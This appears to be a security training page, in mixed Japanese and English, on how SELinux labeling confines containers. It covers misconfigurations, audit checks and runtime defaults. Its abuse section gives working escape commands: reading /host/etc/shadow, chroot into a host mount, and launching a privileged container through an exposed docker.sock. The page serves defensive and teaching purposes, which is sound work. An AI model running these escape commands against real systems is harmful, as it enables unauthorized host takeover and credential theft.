# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

SELinuxは**ラベルベースのMandatory Access Control**システムです。関連するプロセスやオブジェクトはセキュリティコンテキストを持ちうるため、ポリシーがどのドメインがどのタイプにどのようにアクセスできるかを決定します。コンテナ化された環境では、通常runtimeがコンテナプロセスを制限されたcontainer domainで起動し、コンテナの内容に対応するタイプでラベルを付けます。ポリシーが適切に機能していれば、プロセスは自身のラベルが触れることになっているものの読み書きはできる一方、たとえそれらがmountを通じて見えるようになっても他のホストのコンテンツへのアクセスは拒否されます。

これは、一般的なLinux container導入における最も強力なホスト側保護の一つです。特にFedora、RHEL、CentOS Stream、OpenShift、その他SELinux中心のエコシステムでは重要です。そうした環境では、SELinuxを無視するレビュアは、いかにも簡単に見えるホスト侵害の経路が実際にはなぜブロックされているのかを誤解しがちです。

## AppArmor Vs SELinux

最もわかりやすい大局的な違いは、AppArmorがパスベースであるのに対しSELinuxは**ラベルベース**である点です。これはcontainerセキュリティに大きな影響を与えます。パスベースのポリシーは、同じホストのコンテンツが予期しないマウントパスの下で見えるようになると異なる振る舞いをすることがあります。ラベルベースのポリシーは代わりにオブジェクトのラベルが何であり、プロセスのドメインがそれに対して何をできるかを問います。これによりSELinuxが簡単になるわけではありませんが、AppArmorベースのシステムで守備側が時々誤って想定してしまう一連のパストリック（path-trick）への耐性が高くなります。

モデルがラベル指向であるため、containerのボリューム処理やラベルの再設定（relabeling）の判断はセキュリティ上重要です。もしruntimeやオペレータが "make mounts work" といった理由でラベルを過度に変更すると、本来ワークロードを封じ込めるはずだったポリシー境界が意図よりもずっと弱くなってしまう可能性があります。

## ラボ

ホスト上でSELinuxが有効かどうかを確認するには:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
ホスト上の既存のラベルを確認するには:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
ラベリングが無効な実行と通常の実行を比較するには:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
On an SELinux-enabled host, this is a very practical demonstration because it shows the difference between a workload running under the expected container domain and one that has been stripped of that enforcement layer.

## Runtime Usage

Podman is particularly well aligned with SELinux on systems where SELinux is part of the platform default. Rootless Podman plus SELinux is one of the strongest mainstream container baselines because the process is already unprivileged on the host side and is still confined by MAC policy. Docker can also use SELinux where supported, although administrators sometimes disable it to work around volume-labeling friction. CRI-O and OpenShift rely heavily on SELinux as part of their container isolation story. Kubernetes can expose SELinux-related settings too, but their value obviously depends on whether the node OS actually supports and enforces SELinux.

The recurring lesson is that SELinux is not an optional garnish. In the ecosystems that are built around it, it is part of the expected security boundary.

## Misconfigurations

The classic mistake is `label=disable`. Operationally, this often happens because a volume mount was denied and the quickest short-term answer was to remove SELinux from the equation instead of fixing the labeling model. Another common mistake is incorrect relabeling of host content. Broad relabel operations may make the application work, but they can also expand what the container is allowed to touch far beyond what was originally intended.

It is also important not to confuse **installed** SELinux with **effective** SELinux. A host may support SELinux and still be in permissive mode, or the runtime may not be launching the workload under the expected domain. In those cases the protection is much weaker than the documentation might suggest.

## Abuse

When SELinux is absent, permissive, or broadly disabled for the workload, host-mounted paths become much easier to abuse. The same bind mount that would otherwise have been constrained by labels may become a direct avenue to host data or host modification. This is especially relevant when combined with writable volume mounts, container runtime directories, or operational shortcuts that exposed sensitive host paths for convenience.

SELinux often explains why a generic breakout writeup works immediately on one host but fails repeatedly on another even though the runtime flags look similar. The missing ingredient is frequently not a namespace or a capability at all, but a label boundary that stayed intact.

The fastest practical check is to compare the active context and then probe mounted host paths or runtime directories that would normally be label-confined:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
ホストの bind mount が存在し、SELinux のラベリングが無効化または弱体化されている場合、まず情報漏洩が発生することが多い：
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
もし mount が writable で、container が kernel の観点から実質的に host-root であるなら、次のステップは推測するのではなく、制御された host modification をテストすることです：
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux 対応ホストでは、ランタイム状態ディレクトリ周辺のラベルが失われると、直接的な privilege-escalation パスを露呈することもあります:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
これらのコマンドは完全な escape chain の代替にはなりませんが、SELinux がホストデータへのアクセスやホスト側のファイル変更を阻止していたかどうかを非常に迅速に判断できます。

### 完全な例: SELinux 無効 + 書き込み可能なホストマウント

SELinux のラベル付けが無効化され、ホストのファイルシステムが `/host` に書き込み可能でマウントされている場合、full host escape は通常の bind-mount abuse のケースになります：
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
`chroot`が成功した場合、コンテナプロセスはホストのファイルシステム上で動作します:
```bash
id
hostname
cat /etc/passwd | tail
```
### 完全な例: SELinux Disabled + Runtime Directory

ラベルが無効化された後にワークロードが runtime socket に到達できる場合、escape は runtime に委譲できます:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
該当する観察点は、SELinux がしばしばまさにこの種の host-path や runtime-state へのアクセスを防ぐ制御になっているということです。

## チェック

SELinux のチェックの目的は、SELinux が有効になっているかを確認し、現在のセキュリティコンテキストを特定し、対象のファイルやパスが実際にラベルで制限されているかを確認することです。
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
ここで興味深い点:

- `getenforce` は理想的には `Enforcing` を返すべきです。`Permissive` または `Disabled` だと、SELinux セクション全体の意味が変わります。
- 現在のプロセスコンテキストが予期しない、または過度に広範に見える場合、ワークロードは意図したコンテナポリシーの下で実行されていない可能性があります。
- ホストにマウントされたファイルやランタイムディレクトリのラベルがプロセスからあまりにも自由にアクセスできるものであれば、bind mounts ははるかに危険になります。

SELinux 対応プラットフォーム上のコンテナをレビューする際、ラベリングを二次的な詳細として扱わないでください。多くの場合、ラベリングはホストがまだ侵害されていない主な理由のひとつです。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | ホスト依存 | SELinux 対応のホストでは SELinux による分離が利用できますが、正確な挙動はホスト/daemon の設定に依存します | `--security-opt label=disable`, bind mounts の広範なラベル付け変更, `--privileged` |
| Podman | SELinux ホストで一般的に有効 | 無効化されていない限り、SELinux システム上で Podman の一部として通常 SELinux による分離が行われます | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | 一般的に Pod レベルで自動的に割り当てられない | SELinux のサポートは存在しますが、Pods は通常 `securityContext.seLinuxOptions` やプラットフォーム固有のデフォルトが必要です。ランタイムとノード側のサポートも必要です | 弱い、または広範な `seLinuxOptions`, permissive/disabled ノードでの実行, ラベリングを無効にするプラットフォームポリシー |
| CRI-O / OpenShift style deployments | 多くの場合重視される | これらの環境では SELinux がノード分離モデルのコア部分であることが多い | アクセスを過度に広げるカスタムポリシー、互換性のためにラベリングを無効化すること |

SELinux のデフォルトは seccomp のデフォルトよりもディストリビューション依存です。Fedora/RHEL/OpenShift 型のシステムでは、SELinux が分離モデルの中心であることが多いです。SELinux 非対応のシステムでは、単に存在しません。
{{#include ../../../../banners/hacktricks-training.md}}
